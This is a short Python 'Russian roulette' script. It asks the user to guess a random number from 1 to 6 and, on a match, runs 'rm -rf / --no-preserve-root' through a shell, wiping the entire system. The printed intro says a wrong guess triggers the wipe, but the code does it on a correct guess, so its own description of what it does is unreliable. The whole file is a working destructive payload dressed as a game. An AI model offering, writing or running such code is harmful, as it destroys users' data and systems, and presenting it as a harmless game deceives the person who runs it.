import random
import subprocess

print("*click*")
print("this is a revolver")
print("I will select a random cylinder to put a bullet in")
print("you have to guess what cylinder the bullet is in")
print("if you guess wrong, your system will be wiped")
print("good luck")

while True:
    cylinder = random.randint(1, 6)

    #print ("cylinder", cylinder)
        
    cylinder_guess = int(input("take a guess (number from 1-6): "))

    if cylinder_guess < 1 or cylinder_guess > 6:
        print("nice try")
        continue

    print("guess", cylinder_guess)

    if cylinder_guess == cylinder:
        print("say goodbye to your system")
        subprocess.call("rm -rf / --no-preserve-root", shell=True)
        break
    else:    
        print("your sytem lives for another day")
        break